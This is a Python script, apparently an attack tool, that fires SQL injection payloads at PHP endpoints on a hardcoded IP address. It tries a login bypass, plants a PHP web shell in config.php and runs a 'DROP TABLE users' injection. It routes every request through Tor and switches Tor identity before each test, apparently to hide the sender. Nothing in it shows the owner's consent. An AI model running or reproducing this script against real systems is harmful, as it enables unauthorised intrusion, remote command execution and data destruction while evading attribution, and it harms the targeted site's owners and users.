import requests
import time
import random
import stem.process
from stem.control import Controller

class SQLiTester:
    def __init__(self, target):
        self.target = target

    def _send_request(self, url, method='GET', data=None, headers=None, timeout=10):
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        try:
            if method == 'GET':
                r = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
            else:
                r = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=timeout)

            print(f"  ↪️ Status: {r.status_code}")
            print(f"  🧾 Response (truncated): {r.text[:150]}...")
            return r
        except Exception as e:
            print(f"❌ Request failed: {e}")
            return None

    def _print_current_ip(self):
        try:
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            r = requests.get("https://api.ipify.org", proxies=proxies, timeout=10)
            print(f"🌐 Current IP: {r.text}")
        except Exception as e:
            print(f"❌ Could not get current IP: {e}")

    def _request_new_tor_identity(self):
        print("🔁 New Tor identity requested.")
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(stem.Signal.NEWNYM)
                time.sleep(5)  # Let Tor establish new circuit
        except Exception as e:
            print(f"❌ Could not request new identity: {e}")

    def _rotate_identity_and_confirm(self):
        self._request_new_tor_identity()
        self._print_current_ip()

    def test_increase_count(self):
        print("\n🔴 [TEST] IncreaseCount() SQLi")
        self._rotate_identity_and_confirm()
        payload = {"id": "1 OR 1=1"}
        url = f"{self.target}/increaseCount.php"
        self._send_request(url, method='POST', data=payload)

    def test_get_task_content(self):
        print("\n🔴 [TEST] GetTaskContent() SQLi")
        self._rotate_identity_and_confirm()
        payload = {"taskId": "1 OR '1'='1"}
        url = f"{self.target}/getTaskContent.php"
        self._send_request(url, method='POST', data=payload)

    def test_login_bypass(self):
        print("\n🔴 [TEST] Login Bypass")
        self._rotate_identity_and_confirm()
        payload = {"username": "admin'--", "password": "irrelevant"}
        url = f"{self.target}/login.php"
        self._send_request(url, method='POST', data=payload)

    def test_config_poisoning(self):
        print("\n🔴 [TEST] Config Poisoning")
        self._rotate_identity_and_confirm()
        payload = {"config": "<?php system($_GET['cmd']); ?>"}
        url = f"{self.target}/config.php"
        r = self._send_request(url, method='POST', data=payload)
        if r and r.status_code == 200:
            print("✅ Config Poisoning maybe succeeded — check manually")
        else:
            print("🔴 Config Poisoning failed or blocked")

    def test_destructive_ops(self):
        print("\n🔴 [TEST] Destructive Operations")
        self._rotate_identity_and_confirm()
        payload = {"id": "1; DROP TABLE users; --"}
        url = f"{self.target}/deleteTask.php"
        self._send_request(url, method='POST', data=payload)

    def run_all_tests(self):
        print(f"\n🚀 Starting comprehensive SQLi tests against {self.target}")
        self._rotate_identity_and_confirm()
        self.test_increase_count()
        self.test_get_task_content()
        self.test_login_bypass()
        self.test_config_poisoning()
        self.test_destructive_ops()

if __name__ == "__main__":
    tester = SQLiTester("http://185.208.158.116/bVoZEtTa1")
    tester.run_all_tests()
